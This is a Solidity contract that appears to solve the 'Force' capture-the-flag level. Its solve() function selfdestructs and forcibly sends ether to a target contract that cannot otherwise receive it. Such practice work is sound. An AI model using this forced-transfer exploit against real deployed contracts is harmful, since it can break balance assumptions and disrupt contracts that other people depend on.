// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolver {

  address forceInstance;

  constructor(address _forceInstance) {
    forceInstance = _forceInstance;
  }

  function solve() payable public {
    selfdestruct(payable(forceInstance));
  }
}